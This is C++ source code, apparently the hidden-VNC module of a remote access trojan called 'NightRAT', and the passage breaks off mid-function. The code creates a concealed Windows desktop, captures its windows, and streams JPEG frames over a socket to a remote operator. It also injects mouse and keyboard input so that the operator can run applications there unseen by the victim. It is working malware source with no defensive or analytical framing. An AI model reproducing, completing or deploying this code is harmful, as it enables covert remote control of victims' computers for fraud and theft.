#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <uxtheme.h>
#include <dwmapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <deque>
#include <utility>
#include <condition_variable>
#include <iostream>
#include <filesystem>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "dwmapi.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;
namespace fs = std::filesystem;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
    uint32_t dirtyX;
    uint32_t dirtyY;
    uint32_t dirtyWidth;
    uint32_t dirtyHeight;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;
static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 10;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"NightRAT_HiddenDesktop";

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

// Capture -> Encode -> Send pipeline.
// HBITMAP objects are cached in fixed slots and reused until the frame size changes.
struct BitmapSlot {
    HBITMAP hBmp = NULL;
    int width = 0;
    int height = 0;
    bool inUse = false;
};

struct CapturedFrame {
    int slotIndex;
    int width;
    int height;
    int scale;
    int fps;
    bool forceFull;
};

struct EncodedFrame {
    vector<unsigned char> jpeg;
    int width;
    int height;
    int scale;
    int fps;
    int dirtyX;
    int dirtyY;
    int dirtyWidth;
    int dirtyHeight;
    uint32_t format;
};

static const size_t MAX_CAPTURE_QUEUE = 2;
static const size_t MAX_SEND_QUEUE = 2;
static vector<BitmapSlot> g_bitmapSlots(2);
static deque<CapturedFrame> g_captureQueue;
static deque<EncodedFrame> g_sendQueue;
static mutex g_frameMutex;
static condition_variable g_frameCV;
static condition_variable g_sendCV;
static thread g_encodeThread;
static thread g_sendThread;
static atomic_bool g_encodeRunning(false);
static atomic_bool g_sendRunning(false);
static mutex g_logMutex;

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static deque<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

// ---------- Drag state ----------
static HWND  g_dragHwnd     = NULL;
static POINT g_dragStartPt  = {0, 0};
static POINT g_lastMousePos = {0, 0};
static RECT  g_dragStartRect = {0, 0, 0, 0};
static bool  g_dragging     = false;
static LRESULT g_dragHitTest = HTCLIENT;
static HWND  g_hLastWindow  = NULL;
static HWND  g_hCurrentFocus = NULL;
static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
static atomic_int g_staticFrameCount(0);
static atomic_bool g_forceFullFrame(false);
static atomic<DWORD> g_lastInteractiveFullFrameTick(0);

static void request_full_frame(bool immediate = true) {
    DWORD now = GetTickCount();
    if (immediate) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
        return;
    }

    DWORD last = g_lastInteractiveFullFrameTick.load();
    if (last == 0 || now - last >= 120) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
    }
}

// -----------------------------------------------------------------------

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height,
                                 int dirtyX, int dirtyY, int dirtyWidth, int dirtyHeight,
                                 uint32_t format, const vector<unsigned char>& jpegBytes) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor     = 0;
    frameHeader.scale       = (uint32_t)scale;
    frameHeader.fps         = (uint32_t)fps;
    frameHeader.width       = (uint32_t)width;
    frameHeader.height      = (uint32_t)height;
    frameHeader.format      = format;
    frameHeader.dataSize    = (uint32_t)jpegBytes.size();
    frameHeader.dirtyX      = (uint32_t)dirtyX;
    frameHeader.dirtyY      = (uint32_t)dirtyY;
    frameHeader.dirtyWidth  = (uint32_t)dirtyWidth;
    frameHeader.dirtyHeight = (uint32_t)dirtyHeight;

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type      = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size      = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static void initialize_visual_styles() {
    INITCOMMONCONTROLSEX icc{};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_WIN95_CLASSES | ICC_STANDARD_CLASSES | ICC_BAR_CLASSES | ICC_LISTVIEW_CLASSES | ICC_TREEVIEW_CLASSES;
    InitCommonControlsEx(&icc);
    SetThemeAppProperties(STAP_ALLOW_NONCLIENT | STAP_ALLOW_CONTROLS | STAP_ALLOW_WEBCONTENT);
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    static CLSID clsid;
    static bool clsidReady = false;
    if (!clsidReady) {
        if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
        clsidReady = true;
    }
    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid              = EncoderQuality;
    params.Parameter[0].Type             = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues   = 1;
    params.Parameter[0].Value            = &quality;
    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;
    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
}

static void client_log(const string& msg) {
    lock_guard<mutex> lock(g_logMutex);
    cout << "[HVNC] " << msg << endl;
}

// -----------------------------------------------------------------------
//  Frame slot / queue helpers
// -----------------------------------------------------------------------
static void release_slot_locked(int slotIndex) {
    if (slotIndex >= 0 && slotIndex < (int)g_bitmapSlots.size()) {
        g_bitmapSlots[slotIndex].inUse = false;
    }
}

static bool has_free_frame_slot_locked() {
    for (const BitmapSlot& slot : g_bitmapSlots) {
        if (!slot.inUse) return true;
    }
    return !g_captureQueue.empty();
}

static int acquire_frame_slot_locked(HDC hdcScreen, int width, int height) {
    int slotIndex = -1;
    for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
        if (!g_bitmapSlots[i].inUse) {
            slotIndex = (int)i;
            break;
        }
    }

    while (slotIndex < 0 && !g_captureQueue.empty()) {
        CapturedFrame oldFrame = g_captureQueue.front();
        g_captureQueue.pop_front();
        release_slot_locked(oldFrame.slotIndex);
        for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
            if (!g_bitmapSlots[i].inUse) {
                slotIndex = (int)i;
                break;
            }
        }
    }

    if (slotIndex < 0) return -1;

    BitmapSlot& slot = g_bitmapSlots[slotIndex];
    if (!slot.hBmp || slot.width != width || slot.height != height) {
        if (slot.hBmp) {
            DeleteObject(slot.hBmp);
            slot.hBmp = NULL;
        }
        slot.hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
        slot.width = width;
        slot.height = height;
    }
    if (!slot.hBmp) return -1;

    slot.inUse = true;
    return slotIndex;
}

static void clear_frame_pipeline() {
    lock_guard<mutex> lock(g_frameMutex);
    while (!g_captureQueue.empty()) {
        release_slot_locked(g_captureQueue.front().slotIndex);
        g_captureQueue.pop_front();
    }
    g_sendQueue.clear();
    for (BitmapSlot& slot : g_bitmapSlots) {
        slot.inUse = false;
    }
}

static void release_all_bitmap_slots() {
    lock_guard<mutex> lock(g_frameMutex);
    g_captureQueue.clear();
    g_sendQueue.clear();
    for (BitmapSlot& slot : g_bitmapSlots) {
        if (slot.hBmp) {
            DeleteObject(slot.hBmp);
            slot.hBmp = NULL;
        }
        slot.width = 0;
        slot.height = 0;
        slot.inUse = false;
    }
}

static bool read_bitmap_pixels(HBITMAP hBmp, int width, int height, vector<uint32_t>& pixels) {
    if (!hBmp || width <= 0 || height <= 0) return false;

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixels.resize((size_t)width * (size_t)height);
    HDC hdc = GetDC(NULL);
    int rows = GetDIBits(hdc, hBmp, 0, (UINT)height, pixels.data(), &bmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);
    return rows == height;
}

static bool find_dirty_rect(const vector<uint32_t>& current, vector<uint32_t>& previous,
                            int width, int height, RECT& dirty, bool& forceFull) {
    forceFull = previous.size() != current.size();
    if (forceFull) {
        previous = current;
        dirty.left = 0;
        dirty.top = 0;
        dirty.right = width;
        dirty.bottom = height;
        return true;
    }

    int left = width;
    int top = height;
    int right = -1;
    int bottom = -1;

    for (int y = 0; y < height; ++y) {
        const size_t row = (size_t)y * (size_t)width;
        for (int x = 0; x < width; ++x) {
            if (current[row + x] != previous[row + x]) {
                if (x < left) left = x;
                if (y < top) top = y;
                if (x > right) right = x;
                if (y > bottom) bottom = y;
            }
        }
    }

    if (right < left || bottom < top) return false;

    previous = current;
    dirty.left = max(0, left - 4);
    dirty.top = max(0, top - 4);
    dirty.right = min(width, right + 5);
    dirty.bottom = min(height, bottom + 5);
    return true;
}

static bool copy_bitmap_region(HBITMAP hSource, int x, int y, int width, int height,
                               HBITMAP& hCrop, HDC hdcSource, HDC hdcCrop,
                               HGDIOBJ& hOldSource, HGDIOBJ& hOldCrop,
                               int& cropWidth, int& cropHeight) {
    if (!hSource || width <= 0 || height <= 0) return false;

    HDC hdcScreen = GetDC(NULL);
    if (!hCrop || cropWidth != width || cropHeight != height) {
        if (hCrop) {
            SelectObject(hdcCrop, hOldCrop);
            DeleteObject(hCrop);
            hCrop = NULL;
            hOldCrop = NULL;
        }
        hCrop = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hCrop) {
            ReleaseDC(NULL, hdcScreen);
            return false;
        }
        hOldCrop = SelectObject(hdcCrop, hCrop);
        cropWidth = width;
        cropHeight = height;
    }
    ReleaseDC(NULL, hdcScreen);

    hOldSource = SelectObject(hdcSource, hSource);
    BitBlt(hdcCrop, 0, 0, width, height, hdcSource, x, y, SRCCOPY);
    SelectObject(hdcSource, hOldSource);
    hOldSource = NULL;
    return true;
}

// -----------------------------------------------------------------------
//  Encode Worker Thread (Capture Queue -> JPEG Queue)
// -----------------------------------------------------------------------
static void encode_worker() {
    vector<uint32_t> previousPixels;
    vector<uint32_t> currentPixels;
    HDC hdcSource = CreateCompatibleDC(NULL);
    HDC hdcCrop = CreateCompatibleDC(NULL);
    HBITMAP hCrop = NULL;
    HGDIOBJ hOldSource = NULL;
    HGDIOBJ hOldCrop = NULL;
    int cropWidth = 0;
    int cropHeight = 0;

    while (g_encodeRunning) {
        CapturedFrame data{};
        HBITMAP hBmp = NULL;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_captureQueue.empty() || !g_encodeRunning; });
            if (!g_encodeRunning && g_captureQueue.empty()) break;

            while (g_captureQueue.size() > 1) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }

            data = g_captureQueue.front();
            g_captureQueue.pop_front();
            if (data.slotIndex >= 0 && data.slotIndex < (int)g_bitmapSlots.size()) {
                hBmp = g_bitmapSlots[data.slotIndex].hBmp;
            }
        }

        vector<unsigned char> jpeg;
        RECT dirty = {0, 0, data.width, data.height};
        bool forceFull = false;
        bool hasDirty = false;
        bool encoded = false;
        uint32_t format = FRAME_FORMAT_JPEG;
        HBITMAP hEncode = hBmp;

        if (hBmp && read_bitmap_pixels(hBmp, data.width, data.height, currentPixels)) {
            hasDirty = find_dirty_rect(currentPixels, previousPixels, data.width, data.height, dirty, forceFull);
        } else {
            hasDirty = true;
            forceFull = true;
            previousPixels.clear();
        }

        if (data.forceFull) {
            hasDirty = true;
            forceFull = true;
            dirty.left = 0;
            dirty.top = 0;
            dirty.right = data.width;
            dirty.bottom = data.height;
        }

        if (hasDirty) {
            int dirtyWidth = dirty.right - dirty.left;
            int dirtyHeight = dirty.bottom - dirty.top;
            bool useDirty = !forceFull && dirtyWidth > 0 && dirtyHeight > 0 &&
                            (dirtyWidth * dirtyHeight) < ((data.width * data.height) * 85 / 100);

            if (useDirty &&
                copy_bitmap_region(hBmp, dirty.left, dirty.top, dirtyWidth, dirtyHeight,
                                   hCrop, hdcSource, hdcCrop, hOldSource, hOldCrop,
                                   cropWidth, cropHeight)) {
                hEncode = hCrop;
                format = FRAME_FORMAT_JPEG_DIRTY;
            } else {
                dirty.left = 0;
                dirty.top = 0;
                dirty.right = data.width;
                dirty.bottom = data.height;
                hEncode = hBmp;
                format = FRAME_FORMAT_JPEG;
            }

            encoded = hEncode && bitmap_to_jpeg(hEncode, (ULONG)data.scale, jpeg);
            g_staticFrameCount = 0;
        } else {
            g_staticFrameCount++;
        }

        {
            lock_guard<mutex> lock(g_frameMutex);
            release_slot_locked(data.slotIndex);
        }

        if (encoded) {
            lock_guard<mutex> lock(g_frameMutex);
            while (g_sendQueue.size() >= MAX_SEND_QUEUE) {
                g_sendQueue.pop_front();
            }
            g_sendQueue.push_back({std::move(jpeg), data.width, data.height, data.scale, data.fps,
                                   dirty.left, dirty.top, dirty.right - dirty.left, dirty.bottom - dirty.top,
                                   format});
            g_sendCV.notify_one();
        }
    }

    if (hCrop) {
        SelectObject(hdcCrop, hOldCrop);
        DeleteObject(hCrop);
    }
    DeleteDC(hdcSource);
    DeleteDC(hdcCrop);

    lock_guard<mutex> lock(g_frameMutex);
    while (!g_captureQueue.empty()) {
        release_slot_locked(g_captureQueue.front().slotIndex);
        g_captureQueue.pop_front();
    }
}

// -----------------------------------------------------------------------
//  Send Worker Thread (JPEG Queue -> Socket)
// -----------------------------------------------------------------------
static void send_worker() {
    while (g_sendRunning) {
        EncodedFrame data;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_sendCV.wait(lock, [] { return !g_sendQueue.empty() || !g_sendRunning; });
            if (!g_sendRunning && g_sendQueue.empty()) break;

            while (g_sendQueue.size() > 1) {
                g_sendQueue.pop_front();
            }

            data = std::move(g_sendQueue.front());
            g_sendQueue.pop_front();
        }

        safe_send_hvnc_frame(g_socket, data.scale, data.fps, data.width, data.height,
                             data.dirtyX, data.dirtyY, data.dirtyWidth, data.dirtyHeight,
                             data.format, data.jpeg);
    }
}

// -----------------------------------------------------------------------
//  Capture Loop (Producer)
// -----------------------------------------------------------------------
static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) {
        g_captureRunning = false;
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        g_captureRunning = false;
        return;
    }

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
    HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);

    HDC hdcWin = CreateCompatibleDC(hdcScreen);
    HDC hdcFinal = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpWin = NULL;
    HGDIOBJ hOldWin = NULL;
    int winBmpWidth = 0;
    int winBmpHeight = 0;
    vector<HWND> windows;
    DWORD lastWindowEnum = 0;
    DWORD lastFullFrame = 0;

    while (g_captureRunning) {
        DWORD start = GetTickCount();
        int scale, fps;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            fps   = g_targetFps;
        }
        int staticFrames = g_staticFrameCount.load();
        if (staticFrames > 60) fps = 1;
        else if (staticFrames > 30) fps = max(1, fps / 4);
        else if (staticFrames > 12) fps = max(2, fps / 2);

        int dw = (sw * scale) / 100;
        int dh = (sh * scale) / 100;
        if (dw < 1) dw = 1; if (dh < 1) dh = 1;

        int slotIndex = -1;
        {
            lock_guard<mutex> lock(g_frameMutex);
            if (has_free_frame_slot_locked()) {
                slotIndex = acquire_frame_slot_locked(hdcScreen, dw, dh);
            }
        }

        if (slotIndex < 0) {
            DWORD interval = 1000 / (fps > 0 ? fps : 1);
            Sleep(max<DWORD>(5, interval / 2));
            continue;
        }

        // Fill background
        RECT fullRect = { 0, 0, sw, sh };
        FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

        DWORD now = GetTickCount();
        DWORD fullFrameInterval = staticFrames > 30 ? 7000 : 3000;
        bool forceFullFrame = g_forceFullFrame.exchange(false) || (lastFullFrame == 0) || (now - lastFullFrame >= fullFrameInterval);
        DWORD enumInterval = staticFrames > 30 ? 1000 : 350;
        if (windows.empty() || forceFullFrame || now - lastWindowEnum >= enumInterval) {
            windows.clear();
            HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
            while (hwnd) {
                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) windows.push_back(hwnd);
                hwnd = GetWindow(hwnd, GW_HWNDNEXT);
            }
            reverse(windows.begin(), windows.end());
            lastWindowEnum = now;
        }

        const UINT printFlags = PW_RENDERFULLCONTENT;

        for (HWND h : windows) {
            if (!IsWindow(h) || !IsWindowVisible(h)) continue;
            RECT rect;
            if (!GetWindowRect(h, &rect)) continue;
            int ww = rect.right - rect.left;
            int wh = rect.bottom - rect.top;
            if (ww <= 0 || wh <= 0) continue;

            if (!hbmpWin || ww > winBmpWidth || wh > winBmpHeight) {
                if (hbmpWin) {
                    SelectObject(hdcWin, hOldWin);
                    DeleteObject(hbmpWin);
                    hbmpWin = NULL;
                    hOldWin = NULL;
                }
                hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
                if (!hbmpWin) continue;
                hOldWin = SelectObject(hdcWin, hbmpWin);
                winBmpWidth = ww;
                winBmpHeight = wh;
            }

            PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
            if (!PrintWindow(h, hdcWin, printFlags)) {
                HDC hdcRealWin = GetWindowDC(h);
                if (hdcRealWin) {
                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                    ReleaseDC(h, hdcRealWin);
                }
            }
            BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
        }

        HGDIOBJ hOldFinal = SelectObject(hdcFinal, g_bitmapSlots[slotIndex].hBmp);
        SetStretchBltMode(hdcFinal, COLORONCOLOR);
        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
        SelectObject(hdcFinal, hOldFinal);

        {
            lock_guard<mutex> lock(g_frameMutex);
            while (g_captureQueue.size() >= MAX_CAPTURE_QUEUE) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }
            g_captureQueue.push_back({slotIndex, dw, dh, scale, fps, forceFullFrame});
            if (forceFullFrame) lastFullFrame = now;
            g_frameCV.notify_one();
        }

        DWORD elapsed  = GetTickCount() - start;
        DWORD interval = 1000 / (fps > 0 ? fps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }

    SelectObject(hdcMem, hOldMem);
    if (hbmpWin) {
        SelectObject(hdcWin, hOldWin);
        DeleteObject(hbmpWin);
    }
    DeleteObject(hbmpMem);
    DeleteDC(hdcMem);
    DeleteDC(hdcWin);
    DeleteDC(hdcFinal);
    ReleaseDC(NULL, hdcScreen);
}

// -----------------------------------------------------------------------
//  Yardımcı: Ekran koordinatını desktop koordinatına çevir
// -----------------------------------------------------------------------
static DWORD mouse_button_flag(int btn, bool down) {
    if (btn == 1) return down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
    if (btn == 2) return down ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
    return down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
}

static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData = 0) {
    INPUT input{};
    input.type = INPUT_MOUSE;
    input.mi.dx = normX;
    input.mi.dy = normY;
    input.mi.mouseData = mouseData;
    input.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;
    return SendInput(1, &input, sizeof(INPUT)) == 1;
}

static LPARAM key_lparam(WORD vk, bool keyUp) {
    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
    LPARAM lp = 1 | (scan << 16);
    if (keyUp) lp |= 0xC0000000;
    return lp;
}

static bool is_ctrl_key(int vk) {
    return vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL;
}

static bool is_shift_key(int vk) {
    return vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT;
}

static bool is_alt_key(int vk) {
    return vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU;
}

static void set_key_down(BYTE state[256], int vk, bool down) {
    if (vk >= 0 && vk < 256) state[vk] = down ? 0x80 : 0;
}

static void apply_modifier_state(BYTE state[256], bool ctrlDown, bool altDown, bool shiftDown) {
    set_key_down(state, VK_CONTROL, ctrlDown);
    set_key_down(state, VK_LCONTROL, ctrlDown);
    set_key_down(state, VK_RCONTROL, ctrlDown);
    set_key_down(state, VK_MENU, altDown);
    set_key_down(state, VK_LMENU, altDown);
    set_key_down(state, VK_RMENU, altDown);
    set_key_down(state, VK_SHIFT, shiftDown);
    set_key_down(state, VK_LSHIFT, shiftDown);
    set_key_down(state, VK_RSHIFT, shiftDown);
}

static void send_keyboard_message(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam,
                                  bool ctrlDown, bool altDown, bool shiftDown) {
    DWORD targetThreadId = GetWindowThreadProcessId(hwnd, NULL);
    DWORD currentThreadId = GetCurrentThreadId();
    bool attached = false;

    if (targetThreadId && targetThreadId != currentThreadId) {
        attached = AttachThreadInput(currentThreadId, targetThreadId, TRUE) != FALSE;
    }

    BYTE oldState[256] = {};
    BYTE newState[256] = {};
    bool hasOldState = GetKeyboardState(oldState) != FALSE;
    if (hasOldState) {
        memcpy(newState, oldState, sizeof(newState));
    }

    apply_modifier_state(newState, ctrlDown, altDown, shiftDown);
    SetKeyboardState(newState);

    DWORD_PTR result = 0;
    SendMessageTimeoutW(hwnd, msg, wParam, lParam, SMTO_ABORTIFHUNG, 100, &result);

    if (hasOldState) {
        SetKeyboardState(oldState);
    }
    if (attached) {
        AttachThreadInput(currentThreadId, targetThreadId, FALSE);
    }
}

static POINT screen_pt(int normX, int normY) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    POINT pt;
    pt.x = (normX * sw) / 65535;
    pt.y = (normY * sh) / 65535;
    return pt;
}

static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) {
    if (btn == 1) return down ? WM_RBUTTONDOWN : WM_RBUTTONUP;
    if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
    if (dblClick) return WM_LBUTTONDBLCLK;
    return down ? WM_LBUTTONDOWN : WM_LBUTTONUP;
}

static WPARAM mouse_wparam_for_button(int btn, bool down) {
    if (!down) return 0;
    if (btn == 1) return MK_RBUTTON;
    if (btn == 2) return MK_MBUTTON;
    return MK_LBUTTON;
}

struct EnumHitTest {
    POINT pt;
    HWND result;
};

static BOOL CALLBACK HitTestEnumProc(HWND hwnd, LPARAM lParam) {
    EnumHitTest* test = (EnumHitTest*)lParam;
    if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) return TRUE;

    LONG_PTR exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
    if ((exStyle & WS_EX_TRANSPARENT)) return TRUE;

    RECT rc;
    if (GetWindowRect(hwnd, &rc)) {
        if (PtInRect(&rc, test->pt)) {
            test->result = hwnd;
            return FALSE; // Found topmost
        }
    }
    return TRUE;
}

static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
    HWND best = hwnd;
    HWND current = hwnd;

    while (current && IsWindow(current)) {
        best = current;
        POINT clientPt = screenPt;
        if (!ScreenToClient(current, &clientPt)) break;

        HWND child = ChildWindowFromPointEx(current, clientPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
        if (!child || child == current || !IsWindow(child)) break;

        RECT childRect;
        if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
        current = child;
    }

    return best;
}

static HWND target_window_from_screen_point(POINT screenPt) {
    EnumHitTest test = { screenPt, NULL };
    EnumWindows(HitTestEnumProc, (LPARAM)&test);

    if (!test.result) test.result = WindowFromPoint(screenPt);
    if (!test.result || !IsWindow(test.result)) return NULL;

    return resolve_child_window_from_point(test.result, screenPt);
}

static bool is_menu_or_popup(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    wchar_t cls[256];
    if (GetClassNameW(hwnd, cls, 256)) {
        if (wcscmp(cls, L"#32768") == 0) return true; // Standard Win32 Menu
        if (wcsstr(cls, L"Chrome_WidgetWin_1")) {
            // Check if it's a popup/menu by looking for styles
            LONG style = GetWindowLongW(hwnd, GWL_STYLE);
            if ((style & WS_POPUP) && !(style & WS_CAPTION)) return true;
        }
        if (wcsstr(cls, L"DropDown") || wcsstr(cls, L"Menu") || wcsstr(cls, L"Popup")) return true;
    }
    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
    return (style & WS_POPUP) && !(style & WS_CAPTION);
}

static void activate_target_window(HWND hwnd, UINT msg, LRESULT ht) {
    if (!hwnd || !IsWindow(hwnd)) return;
    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
    if (!hRoot) hRoot = hwnd;

    g_hLastWindow = hRoot;

    // Don't switch focus/foreground if clicking a menu or a window that already has its root active
    if (is_menu_or_popup(hwnd)) return;

    HWND hFore = GetForegroundWindow();
    if (hFore != hRoot) {
